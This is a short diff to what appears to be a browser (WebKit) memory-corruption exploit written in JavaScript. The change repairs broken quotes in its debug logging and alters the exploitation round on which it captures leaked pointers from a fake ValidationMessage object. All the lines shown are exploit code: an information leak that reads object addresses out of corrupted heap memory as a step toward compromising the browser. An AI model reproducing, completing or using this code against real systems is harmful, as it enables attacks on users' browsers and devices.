@@ -356,9 +356,9 @@ function reuseTargetObj() {
 }
 
 function dumpTargetObj() {
-	debug_log([+] m_timer: " + g_timer_leak);
-	debug_log([+] m_messageHeading: " + g_message_heading_leak);
-	debug_log([+] m_messageBody: " + g_message_body_leak);
+	debug_log("[+] m_timer: " + g_timer_leak);
+	debug_log("[+] m_messageHeading: " + g_message_heading_leak);
+	debug_log("[+] m_messageBody: " + g_message_body_leak);
 }
 
 function findTargetObj() {
@@ -366,7 +366,7 @@ function findTargetObj() {
 		if (!Int64.fromDouble(g_arr_ab_1[i][2]).equals(Int64.Zero)) {
 			debug_log("[+] Found fake ValidationMessage");
 
-			if (g_round === 2) {
+			if (g_round === 4) {
 				g_timer_leak = Int64.fromDouble(g_arr_ab_1[i][2]);
 				g_message_heading_leak = Int64.fromDouble(g_arr_ab_1[i][4]);
 				g_message_body_leak = Int64.fromDouble(g_arr_ab_1[i][5]);
